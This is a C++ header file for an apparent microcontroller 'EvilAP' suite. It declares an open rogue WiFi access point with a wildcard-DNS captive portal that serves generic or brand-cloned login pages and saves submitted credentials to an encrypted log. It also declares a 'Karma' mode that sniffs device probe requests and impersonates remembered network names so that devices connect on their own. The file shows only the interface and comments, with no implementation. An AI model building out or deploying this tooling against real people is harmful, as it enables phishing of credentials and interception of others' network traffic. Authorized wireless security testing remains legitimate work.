// ============================================================================
// evilap.h - EvilAP / captive portal suite (Step 3)
// ----------------------------------------------------------------------------
// Starts an OPEN WiFi AP under a chosen SSID and serves a login-style portal:
//   * Any hostname resolves to us (DNS wildcard on port 53) -> captive portal
//   * Built-in templates (generic WiFi login, brand-styled clones) or a fully
//     custom HTML page (/portal.html on the SD card, editable via Files tab)
//   * Submitted credentials are appended encrypted to /logs/creds.enc
//   * Exits: http://<ip>/disable from a browser, or hold the BOOT button ~1.5s
//     while the portal is running. Normal config AP is restored afterwards.
//
// NOTE: EvilAP replaces the management AP while running (same radio). The UI
// warns about this when starting.
// ============================================================================
#pragma once
#include <Arduino.h>

namespace evilap {

struct Stats {
    uint32_t hits = 0;       // portal pages served
    uint32_t captures = 0;   // credential submissions
};

bool running();
Stats stats();

bool start(const String& ssid, const String& htmlName);  // "" = default template
void stop();                                             // restores normal AP
void handle();                                           // call from loop()

// ---- Karma mode ----
// Sniffs probe requests (devices asking for networks they remember), then
// brings the portal up under the most-requested SSID. Devices that trust
// the name connect on their own - no deauth needed.
void karmaStart();              // begin probe sniffing (channel hopping)
void karmaStop();
bool karmaProbing();            // currently listening for probes?
bool karmaSpawn(const String& ssid);  // portal under a probed SSID (like start)
std::vector<std::pair<String,uint32_t>> karmaProbeList(); // ssid -> hit count

// Template helpers
std::vector<String> templateNames();                     // built-ins
String renderTemplate(const String& name);               // full HTML document
String renderCustom();                                   // /portal.html from SD

} // namespace evilap
